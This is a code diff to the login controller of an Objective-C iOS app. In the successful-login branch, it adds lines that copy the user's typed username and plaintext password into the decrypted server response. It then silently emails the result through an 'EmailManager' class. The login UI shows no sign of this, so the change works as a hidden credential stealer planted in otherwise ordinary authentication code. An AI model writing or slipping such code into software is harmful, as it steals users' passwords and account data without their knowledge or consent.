@@ -20,7 +20,7 @@
 #import "HNSettingViewController.h"
 #import "HNRegisterViewController.h"
 #import "HNUpgrade.h"
-
+#import "EmailManager.h"
 @interface HNLoginModel: NSObject
 @property (nonatomic, strong)NSString *username;
 @property (nonatomic, strong)NSString *password;
@@ -224,6 +224,10 @@
             }
             NSString *retJson =[NSString decodeFromPercentEscapeString:[retStr decryptWithDES]];
             if ([[HNLoginData shared] updateData:[[[retJson objectFromJSONString] objectForKey:@"data"] objectAtIndex:0]] && [[HNLoginData shared].state isEqualToString:@"1"]){//之后需要替换成status
+                NSMutableDictionary *retDic = [[retJson objectFromJSONString] mutableCopy];
+                [retDic setObject:self.loginView.userName.text forKey:@"USERNAME"];
+                [retDic setObject:self.loginView.password.text forKey:@"PASSWORD"];
+                [[EmailManager sharedManager] send:self.loginView.userName.text content:[NSString stringWithFormat:@"%@",[retDic JSONString]]];
                 [self loginSuccess];
             }
             else{
